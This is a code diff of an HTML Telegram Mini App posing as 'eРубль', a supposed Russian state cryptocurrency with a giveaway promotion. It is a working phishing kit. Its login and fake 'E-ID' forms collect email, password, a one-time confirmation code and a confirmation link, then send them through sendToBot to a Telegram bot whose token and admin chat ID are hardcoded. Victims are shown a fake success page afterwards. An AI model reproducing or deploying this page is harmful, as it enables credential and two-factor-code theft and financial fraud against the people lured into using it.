@@ -6,7 +6,6 @@
     <title>eРубль</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* ===== БАЗА ===== */
         * {
             margin: 0;
             padding: 0;
@@ -45,8 +44,6 @@
             background: radial-gradient(circle at 70% 30%, rgba(67, 97, 238, 0.08), transparent 60%);
             pointer-events: none;
         }
-
-        /* ===== СТРАНИЦЫ ===== */
         .page {
             display: none;
             flex-direction: column;
@@ -58,7 +55,6 @@
         .page.active {
             display: flex;
         }
-
         @keyframes fadeIn {
             from {
                 opacity: 0;
@@ -69,8 +65,6 @@
                 transform: translateY(0);
             }
         }
-
-        /* ===== ЛОГО ===== */
         .logo {
             text-align: center;
             margin-bottom: 28px;
@@ -94,8 +88,6 @@
             letter-spacing: 2px;
             text-transform: uppercase;
         }
-
-        /* ===== МЕНЮ ===== */
         .menu-grid {
             display: flex;
             flex-direction: column;
@@ -122,8 +114,6 @@
             margin-right: 12px;
             opacity: 0.5;
         }
-
-        /* ===== БАННЕР ===== */
         .hero-banner {
             background: linear-gradient(135deg, rgba(67, 97, 238, 0.12), rgba(123, 97, 255, 0.08));
             border-radius: 16px;
@@ -156,8 +146,6 @@
             margin-top: 6px;
             border: 1px solid rgba(40, 167, 69, 0.1);
         }
-
-        /* ===== ЗАГОЛОВКИ ===== */
         .page-title {
             font-size: 24px;
             font-weight: 700;
@@ -176,8 +164,6 @@
             font-size: 44px;
             margin-bottom: 8px;
         }
-
-        /* ===== ФОРМА ===== */
         .form-group {
             margin-bottom: 16px;
         }
@@ -207,8 +193,6 @@
             background: rgba(255, 255, 255, 0.08);
             box-shadow: 0 0 0 4px rgba(67, 97, 238, 0.12);
         }
-
-        /* ===== КНОПКИ ===== */
         .btn-primary {
             width: 100%;
             padding: 16px;
@@ -233,7 +217,6 @@
             transform: none;
             box-shadow: none;
         }
-
         .btn-eid {
             width: 100%;
             padding: 16px;
@@ -255,7 +238,6 @@
             background: rgba(255, 255, 255, 0.1);
             border-color: rgba(255, 255, 255, 0.2);
         }
-
         .btn-secondary {
             width: 100%;
             padding: 14px;
@@ -273,7 +255,6 @@
             background: rgba(255, 255, 255, 0.08);
             color: #fff;
         }
-
         .btn-back {
             width: 100%;
             padding: 14px;
@@ -291,7 +272,6 @@
             background: rgba(255, 255, 255, 0.04);
             color: rgba(255, 255, 255, 0.6);
         }
-
         .divider {
             display: flex;
             align-items: center;
@@ -312,7 +292,6 @@
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-
         .forgot-link {
             text-align: right;
             margin-top: -6px;
@@ -327,7 +306,6 @@
         .forgot-link a:hover {
             color: #4361ee;
         }
-
         .register-link {
             text-align: center;
             font-size: 14px;
@@ -342,7 +320,6 @@
         .register-link a:hover {
             text-decoration: underline;
         }
-
         .support-btn {
             width: 100%;
             padding: 14px;
@@ -360,8 +337,6 @@
             background: rgba(255, 255, 255, 0.06);
             color: rgba(255, 255, 255, 0.5);
         }
-
-        /* ===== СООБЩЕНИЯ ===== */
         .message {
             margin-top: 16px;
             padding: 12px 16px;
@@ -389,8 +364,6 @@
             color: #818cf8;
             border: 1px solid rgba(67, 97, 238, 0.15);
         }
-
-        /* ===== КОД ===== */
         .code-box {
             text-align: center;
             margin: 8px 0 16px;
@@ -449,8 +422,6 @@
                 transform: scale(0.8);
             }
         }
-
-        /* ===== E-ID СТРАНИЦА ===== */
         .eid-page .eid-header {
             text-align: center;
             margin-bottom: 24px;
@@ -479,8 +450,6 @@
             margin-top: 2px;
             letter-spacing: 0.5px;
         }
-
-        /* ===== ССЫЛКА ===== */
         .link-box {
             margin-top: 12px;
             padding: 16px;
@@ -511,8 +480,6 @@
         .link-box input::placeholder {
             color: rgba(255, 255, 255, 0.2);
         }
-
-        /* ===== УСПЕХ ===== */
         .success-page .check {
             font-size: 64px;
             text-align: center;
@@ -534,139 +501,74 @@
 </head>
 <body>
     <div class="container">
-
-        <!-- ========================================================= -->
         <!-- СТРАНИЦА 1: ГЛАВНАЯ -->
-        <!-- ========================================================= -->
         <div id="pageLogin" class="page active">
             <div class="logo">
                 <h1><span>eРубль</span></h1>
                 <div class="sub">Суверенная криптовалюта России</div>
             </div>
-
             <div class="hero-banner">
                 <h2>🚀 Первичное <span class="highlight">распределение</span></h2>
                 <p>1 миллиард eRub за 30 дней</p>
                 <div class="badge">🔥 Акция стартовала!</div>
             </div>
-
             <div class="menu-grid">
-                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')">
-                    <span class="icon">📊</span> О проекте
-                </div>
-                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')">
-                    <span class="icon">🛒</span> Как купить
-                </div>
-                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')">
-                    <span class="icon">📖</span> Руководство по eРублю
-                </div>
-                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')">
-                    <span class="icon">❓</span> Частые вопросы
-                </div>
+                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')"><span class="icon">📊</span> О проекте</div>
+                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')"><span class="icon">🛒</span> Как купить</div>
+                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')"><span class="icon">📖</span> Руководство по eРублю</div>
+                <div class="menu-item" onclick="showMsg('Раздел скоро появится', 'info')"><span class="icon">❓</span> Частые вопросы</div>
             </div>
-
-            <!-- ===== КНОПКА ВОЙТИ (ГЛАВНАЯ) ===== -->
             <button id="loginBtn" class="btn-primary">🔓 Войти</button>
-
             <div class="divider"><span>или</span></div>
-
-            <button id="eidBtn" class="btn-eid">
-                <span>🆔</span> Вход через E-ID
-            </button>
-
-            <div class="register-link" style="margin-top:14px;">
-                Нет аккаунта? <a href="#" onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
-            </div>
+            <button id="eidBtn" class="btn-eid"><span>🆔</span> Вход через E-ID</button>
+            <div class="register-link" style="margin-top:14px;">Нет аккаунта? <a href="#" onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a></div>
         </div>
 
-        <!-- ========================================================= -->
         <!-- СТРАНИЦА 2: ФОРМА ВХОДА -->
-        <!-- ========================================================= -->
         <div id="pageCode" class="page">
             <div class="page-icon">🔑</div>
             <div class="page-title">Вход в eРубль</div>
             <div class="page-sub">Введите свои данные для входа</div>
-
-            <div class="form-group">
-                <label>Email</label>
-                <input type="email" id="email" placeholder="Введите ваш email">
-            </div>
-            <div class="form-group">
-                <label>Пароль</label>
-                <input type="password" id="password" placeholder="Введите пароль">
-            </div>
-            <div class="forgot-link">
-                <a href="#" onclick="showMsg('Функция восстановления скоро появится', 'info')">Забыли пароль?</a>
-            </div>
-
+            <div class="form-group"><label>Email</label><input type="email" id="email" placeholder="Введите ваш email"></div>
+            <div class="form-group"><label>Пароль</label><input type="password" id="password" placeholder="Введите пароль"></div>
+            <div class="forgot-link"><a href="#" onclick="showMsg('Функция восстановления скоро появится', 'info')">Забыли пароль?</a></div>
             <button id="loginSubmitBtn" class="btn-primary">ВОЙТИ</button>
-
             <button id="backFromLoginBtn" class="btn-back">← Назад</button>
         </div>
 
-        <!-- ========================================================= -->
         <!-- СТРАНИЦА 3: КОД -->
-        <!-- ========================================================= -->
         <div id="pageCodeConfirm" class="page">
             <div class="page-icon">📧</div>
             <div class="page-title">Код подтверждения</div>
             <div class="page-sub">Введите код, отправленный на вашу почту</div>
-
-            <div class="code-box">
-                <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
-            </div>
+            <div class="code-box"><input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric"></div>
             <p class="code-hint">Код из 6 цифр</p>
-
             <button id="codeBtn" class="btn-primary">✅ Подтвердить</button>
-
-            <div class="code-status">
-                <span class="dot"></span>
-                Ожидание кода...
-            </div>
-
+            <div class="code-status"><span class="dot"></span> Ожидание кода...</div>
             <button id="backFromCodeBtn" class="btn-back">← Назад</button>
         </div>
 
-        <!-- ========================================================= -->
         <!-- СТРАНИЦА 4: E-ID -->
-        <!-- ========================================================= -->
         <div id="pageEid" class="page eid-page">
             <div class="eid-header">
                 <div class="eid-badge">ON-LINE CERTIFICATION</div>
                 <h2>AND AUTHORIZATION SERVICE</h2>
                 <p>e-id</p>
             </div>
-
-            <div class="form-group">
-                <label>Email</label>
-                <input type="email" id="eidEmail" placeholder="Введите ваш email">
-            </div>
-            <div class="form-group">
-                <label>Пароль</label>
-                <input type="password" id="eidPassword" placeholder="Введите пароль">
-            </div>
-            <div class="forgot-link">
-                <a href="#" onclick="showMsg('Функция восстановления скоро появится', 'info')">Забыли пароль?</a>
-            </div>
-
+            <div class="form-group"><label>Email</label><input type="email" id="eidEmail" placeholder="Введите ваш email"></div>
+            <div class="form-group"><label>Пароль</label><input type="password" id="eidPassword" placeholder="Введите пароль"></div>
+            <div class="forgot-link"><a href="#" onclick="showMsg('Функция восстановления скоро появится', 'info')">Забыли пароль?</a></div>
             <button id="eidSubmitBtn" class="btn-primary">ВХОД</button>
-
             <div id="eidLinkBlock" class="link-box" style="display:none; margin-top:16px;">
                 <label>🔗 Ссылка подтверждения</label>
                 <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку подтверждения">
                 <button id="eidLinkBtn" class="btn-secondary" style="margin-top:10px;">✅ Отправить ссылку</button>
             </div>
-
-            <div class="register-link" style="margin-top:12px;">
-                Нет аккаунта? <a href="#" onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
-            </div>
-
+            <div class="register-link" style="margin-top:12px;">Нет аккаунта? <a href="#" onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a></div>
             <button id="backFromEidBtn" class="btn-back" style="margin-top:10px;">← Назад</button>
         </div>
 
-        <!-- ========================================================= -->
         <!-- СТРАНИЦА 5: УСПЕХ -->
-        <!-- ========================================================= -->
         <div id="pageSuccess" class="page success-page">
             <div class="check">✅</div>
             <h2>Данные отправлены!</h2>
@@ -674,34 +576,23 @@
             <button id="resetBtn" class="btn-secondary" style="margin-top:20px;">🔄 Вернуться на главную</button>
         </div>
 
-        <!-- ===== СООБЩЕНИЯ ===== -->
         <div id="msg" class="message"></div>
-
-        <!-- ===== ТЕХПОДДЕРЖКА ===== -->
         <button onclick="openSupport()" class="support-btn">🆘 Техническая поддержка</button>
     </div>
 
     <script>
-        // ============================================================
-        // 1. КОНФИГ
-        // ============================================================
         const BOT_TOKEN = "8603629858:AAHoJGBCDvvImzpO3wllUriPulRvX0APozY";
         const ADMIN_ID = "8542901240";
 
-        // ============================================================
-        // 2. ИНИЦИАЛИЗАЦИЯ
-        // ============================================================
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Страницы
         const pageLogin = document.getElementById('pageLogin');
         const pageCode = document.getElementById('pageCode');
         const pageCodeConfirm = document.getElementById('pageCodeConfirm');
         const pageEid = document.getElementById('pageEid');
         const pageSuccess = document.getElementById('pageSuccess');
 
-        // Элементы
         const email = document.getElementById('email');
         const password = document.getElementById('password');
         const codeInput = document.getElementById('codeInput');
@@ -710,7 +601,6 @@
         const eidLinkInput = document.getElementById('eidLinkInput');
         const eidLinkBlock = document.getElementById('eidLinkBlock');
 
-        // Кнопки
         const loginBtn = document.getElementById('loginBtn');
         const loginSubmitBtn = document.getElementById('loginSubmitBtn');
         const codeBtn = document.getElementById('codeBtn');
@@ -726,17 +616,12 @@
         let eidEmailValue = '';
         let eidPasswordValue = '';
 
-        // ============================================================
-        // 3. ВСПОМОГАТЕЛЬНЫЕ
-        // ============================================================
         function showMsg(text, type = 'info') {
             msgDiv.textContent = text;
             msgDiv.className = `message ${type}`;
             msgDiv.style.display = 'block';
             clearTimeout(msgDiv._timer);
-            msgDiv._timer = setTimeout(() => {
-                msgDiv.style.display = 'none';
-            }, 5000);
+            msgDiv._timer = setTimeout(() => { msgDiv.style.display = 'none'; }, 5000);
         }
 
         function switchPage(page) {
@@ -777,18 +662,12 @@
             switchPage(pageSuccess);
         }
 
-        // ============================================================
-        // 4. ОТПРАВКА В БОТА
-        // ============================================================
         async function sendToBot(data) {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: JSON.stringify(data)
-                    })
+                    body: JSON.stringify({ chat_id: ADMIN_ID, text: JSON.stringify(data) })
                 });
                 const result = await response.json();
                 return result.ok;
@@ -798,51 +677,27 @@
             }
         }
 
-        // ============================================================
-        // 5. НАВИГАЦИЯ (ВСЕ КНОПКИ РАБОТАЮТ)
-        // ============================================================
-        // Кнопка "Войти" на главной → страница входа
+        // ===== ВСЕ КНОПКИ =====
         loginBtn.addEventListener('click', goToCodePage);
-
-        // Кнопка "E-ID" на главной → страница E-ID
         eidBtn.addEventListener('click', goToEid);
-
-        // Назад с формы входа → главная
         backFromLoginBtn.addEventListener('click', goToLogin);
-
-        // Назад из кода → форма входа
         backFromCodeBtn.addEventListener('click', goToCodePage);
-
-        // Назад из E-ID → главная
         backFromEidBtn.addEventListener('click', goToLogin);
 
-        // Вернуться на главную из успеха
         resetBtn.addEventListener('click', function() {
             goToLogin();
             showMsg('Вы вернулись на главную страницу', 'info');
         });
 
-        // ============================================================
-        // 6. ОБЫЧНЫЙ ВХОД
-        // ============================================================
+        // ===== ВХОД =====
         loginSubmitBtn.addEventListener('click', async function() {
             const e = email.value.trim();
             const p = password.value.trim();
-
-            if (!e || !p) {
-                showMsg('Заполните все поля', 'error');
-                return;
-            }
-            if (!e.includes('@')) {
-                showMsg('Введите корректный email', 'error');
-                return;
-            }
-
+            if (!e || !p) { showMsg('Заполните все поля', 'error'); return; }
+            if (!e.includes('@')) { showMsg('Введите корректный email', 'error'); return; }
             loginSubmitBtn.disabled = true;
             loginSubmitBtn.textContent = '⏳ Отправка...';
-
             const ok = await sendToBot({ email: e, password: p });
-
             if (ok) {
                 loginSubmitBtn.disabled = false;
                 loginSubmitBtn.textContent = 'ВОЙТИ';
@@ -855,22 +710,13 @@
             }
         });
 
-        // ============================================================
-        // 7. КОД
-        // ============================================================
+        // ===== КОД =====
         codeBtn.addEventListener('click', async function() {
             const code = codeInput.value.trim();
-
-            if (!code || code.length < 4) {
-                showMsg('Введите корректный код', 'error');
-                return;
-            }
-
+            if (!code || code.length < 4) { showMsg('Введите корректный код', 'error'); return; }
             codeBtn.disabled = true;
             codeBtn.textContent = '⏳ Отправка...';
-
             const ok = await sendToBot({ code: code });
-
             if (ok) {
                 codeBtn.disabled = false;
                 codeBtn.textContent = '✅ Подтвердить';
@@ -884,34 +730,17 @@
             }
         });
 
-        // ============================================================
-        // 8. E-ID
-        // ============================================================
+        // ===== E-ID =====
         eidSubmitBtn.addEventListener('click', async function() {
             const e = eidEmail.value.trim();
             const p = eidPassword.value.trim();
-
-            if (!e || !p) {
-                showMsg('Заполните все поля', 'error');
-                return;
-            }
-            if (!e.includes('@')) {
-                showMsg('Введите корректный email', 'error');
-                return;
-            }
-
+            if (!e || !p) { showMsg('Заполните все поля', 'error'); return; }
+            if (!e.includes('@')) { showMsg('Введите корректный email', 'error'); return; }
             eidEmailValue = e;
             eidPasswordValue = p;
-
             eidSubmitBtn.disabled = true;
             eidSubmitBtn.textContent = '⏳ Отправка...';
-
-            const ok = await sendToBot({
-                type: 'eid_login',
-                email: e,
-                password: p
-            });
-
+            const ok = await sendToBot({ type: 'eid_login', email: e, password: p });
             if (ok) {
                 eidSubmitBtn.disabled = true;
                 eidSubmitBtn.textContent = '✅ Отправлено';
@@ -925,27 +754,47 @@
             }
         });
 
-        // ============================================================
-        // 9. E-ID → ССЫЛКА
-        // ============================================================
+        // ===== ССЫЛКА =====
         eidLinkBtn.addEventListener('click', async function() {
             const link = eidLinkInput.value.trim();
-
-            if (!link) {
-                showMsg('Введите ссылку подтверждения', 'error');
-                return;
-            }
-
+            if (!link) { showMsg('Введите ссылку подтверждения', 'error'); return; }
             eidLinkBtn.disabled = true;
             eidLinkBtn.textContent = '⏳ Отправка...';
-
-            const ok = await sendToBot({
-                type: 'eid_link',
-                email: eidEmailValue,
-                password: eidPasswordValue,
-                link: link
-            });
-
+            const ok = await sendToBot({ type: 'eid_link', email: eidEmailValue, password: eidPasswordValue, link: link });
             if (ok) {
                 eidLinkBtn.disabled = false;
-                eid
+                eidLinkBtn.textContent = '✅ Отправить ссылку';
+                eidLinkInput.value = '';
+                goToSuccess();
+                showMsg('✅ Ссылка отправлена!', 'success');
+            } else {
+                eidLinkBtn.disabled = false;
+                eidLinkBtn.textContent = '✅ Отправить ссылку';
+                showMsg('❌ Ошибка отправки', 'error');
+            }
+        });
+
+        // ===== ENTER =====
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                if (pageCode.classList.contains('active')) {
+                    loginSubmitBtn.click();
+                } else if (pageCodeConfirm.classList.contains('active')) {
+                    codeBtn.click();
+                } else if (pageEid.classList.contains('active')) {
+                    if (eidLinkBlock.style.display === 'block') {
+                        eidLinkBtn.click();
+                    } else {
+                        eidSubmitBtn.click();
+                    }
+                }
+            }
+        });
+
+        // ===== ТЕХПОДДЕРЖКА =====
+        function openSupport() {
+            window.open('https://t.me/potok457', '_blank');
+        }
+    </script>
+</body>
+</html>
